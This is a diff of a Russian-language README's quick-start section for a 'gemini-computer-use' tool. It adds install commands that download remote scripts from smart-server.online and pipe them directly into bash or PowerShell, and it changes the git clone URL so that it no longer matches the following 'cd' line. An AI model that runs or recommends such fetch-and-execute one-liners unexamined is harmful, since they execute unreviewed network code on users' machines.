@@ -42,12 +42,24 @@
 
 ## 🚀 Быстрый старт
 
-### 1. Установка на вашей машине
-
-Выполните команду в терминале вашего ПК, ноутбука или сервера:
-
+#### 🐧 Linux & 🍎 macOS (через curl):
 ```bash
-git clone https://github.com/levra7/gemini-computer-use.git
+curl -fsSL https://smart-server.online/install.sh | bash
+```
+
+#### 🪟 Windows (через PowerShell):
+```powershell
+irm https://smart-server.online/install.ps1 | iex
+```
+
+#### 📦 Node.js / NPM (Кроссплатформенно):
+```bash
+npx gemini-computer-use
+```
+
+#### 🛠️ Либо вручную через Git:
+```bash
+git clone https://github.com/LevRa7/Gemini-APP-Web-for-computer-use---FREE.git
 cd gemini-computer-use
 ./install.sh --quick
 ```
